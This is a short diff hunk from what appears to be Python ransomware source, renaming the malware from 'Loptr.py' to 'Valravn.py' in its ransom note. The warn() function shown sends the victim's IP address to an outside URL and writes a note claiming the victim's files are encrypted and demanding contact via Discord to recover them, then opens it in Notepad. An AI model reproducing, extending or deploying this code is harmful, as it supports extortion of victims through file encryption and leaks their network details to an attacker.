@@ -38,7 +38,7 @@ def warn():
     data["username"] = ip
     requests.post(url, data=json.dumps(data), headers={"Content-Type": "application/json"})
     f = open("loptr.txt", "w")
-    f.write("Ooops you have been infected with Loptr.py! your files are encrypted! Contact " + name + " on discord to get your files back!")
+    f.write("Ooops you have been infected with Valravn.py! your files are encrypted! Contact " + name + " on discord to get your files back!")
     f.close()
     subprocess.call(r"notepad loptr.txt", shell=False)
 
